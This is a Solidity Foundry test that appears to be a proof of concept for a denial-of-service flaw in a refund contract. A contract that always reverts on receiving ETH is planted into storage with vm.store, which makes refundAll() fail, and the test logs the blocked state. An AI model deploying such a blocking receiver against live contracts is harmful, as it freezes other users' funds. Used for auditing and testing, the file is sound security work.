// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/send_loop.sol";

contract MaliciousReceiver {
    fallback() external payable {
        revert("I refuse to accept ETH");
    }
}

contract RefunderTest is Test {
    Refunder refunder;
    address owner = address(0x1);
    MaliciousReceiver malicious;

    function setUp() public {
        vm.startPrank(owner);
        refunder = new Refunder();
        malicious = new MaliciousReceiver();
        vm.stopPrank();

        // Fund the owner address
        vm.deal(owner, 10 ether);

        // Add funds to refunder contract through owner
        vm.prank(owner);
        refunder.addFunds{value: 1 ether}();
    }

    function testRefundAllDoS() public {
        // Simulate malicious contract being added to refundAddresses
        bytes32 arrayLengthSlot = bytes32(uint256(0));
        bytes32 firstElementSlot = keccak256(abi.encode(uint256(0)));

        vm.store(
            address(refunder),
            firstElementSlot,
            bytes32(uint256(uint160(address(malicious))))
        );

        vm.store(
            address(refunder),
            arrayLengthSlot,
            bytes32(uint256(1))
        );

        vm.store(
            address(refunder),
            keccak256(abi.encode(address(malicious), uint256(1))),
            bytes32(uint256(0.5 ether))
        );

        console.log("--- BEFORE-Trigger State ---");
        uint256 balanceBefore = address(refunder).balance;
        uint256 maliciousRefundBefore = refunder.refunds(address(malicious));
        uint256 totalRefundedBefore = refunder.totalRefunded();
        console.log("Contract ETH Balance (pre): %s", balanceBefore);
        console.log("Malicious Refund Amount (pre): %s", maliciousRefundBefore);
        console.log("Total Refunded (pre): %s", totalRefundedBefore);

        console.log("--- Trigger refundAll (expect revert) ---");
        vm.expectRevert();
        refunder.refundAll();

        console.log("--- AFTER-Trigger State ---");
        uint256 balanceAfter = address(refunder).balance;
        uint256 maliciousRefundAfter = refunder.refunds(address(malicious));
        uint256 totalRefundedAfter = refunder.totalRefunded();
        console.log("Contract ETH Balance (post): %s", balanceAfter);
        console.log("Malicious Refund Amount (post): %s", maliciousRefundAfter);
        console.log("Total Refunded (post): %s", totalRefundedAfter);

        bool unchanged = (balanceAfter == balanceBefore) && 
                         (maliciousRefundAfter == maliciousRefundBefore) && 
                         (totalRefundedAfter == totalRefundedBefore);
        
        if (unchanged) {
            console.log("Verdict: All states unchanged - Refunds fully blocked");
            console.log("Vulnerability Exists: Malicious contract permanently blocks refund processing");
        } else {
            console.log("Verdict: Unexpected state change occurred");
            console.log("Vulnerability not Exist: DoS attack did not fully prevent state changes");
        }
    }
}